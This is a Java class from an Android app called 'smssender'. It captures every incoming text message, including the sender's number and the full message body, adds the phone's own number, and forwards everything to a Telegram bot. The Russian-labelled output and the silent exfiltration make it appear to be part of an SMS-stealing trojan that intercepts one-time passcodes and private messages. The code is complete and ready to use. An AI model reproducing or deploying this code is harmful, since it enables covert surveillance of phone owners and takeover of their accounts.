package com.agayev.smssender;

import static com.agayev.smssender.SMSReceiver.TELEGRAM_CHAT_ID;
import static com.agayev.smssender.SMSReceiver.TELEGRAM_TOKEN;
import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;

import com.agayev.smssender.network.ApiClient;

public class SmsHandler {
    private ApiClient client;

    public SmsHandler() {
        client = new ApiClient();
    }

    public void handleSms(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                StringBuilder messageBodyBuilder = new StringBuilder();
                String senderPhoneNumber = null;
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String msg = smsMessage.getMessageBody();
                    messageBodyBuilder.append(msg);
                    if (senderPhoneNumber == null) {
                        senderPhoneNumber = smsMessage.getOriginatingAddress();
                    }
                }
                String messageBody = messageBodyBuilder.toString();

                // Get the user's phone number
                TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                String userPhoneNumber = null;
                if (context.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                    userPhoneNumber = telephonyManager.getLine1Number();
                } else {
                    userPhoneNumber = "Permission not granted";
                }

                String fullMessage = "☎\uFE0F СМС от номера → " + senderPhoneNumber +
                        "\n\n\uD83D\uDCAC Текст СМС → " + messageBody +
                        "\n\n\uD83D\uDCF1 Номер абонента → " + userPhoneNumber;
                client.sendMessage(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, fullMessage);
            }
        }
    }
}
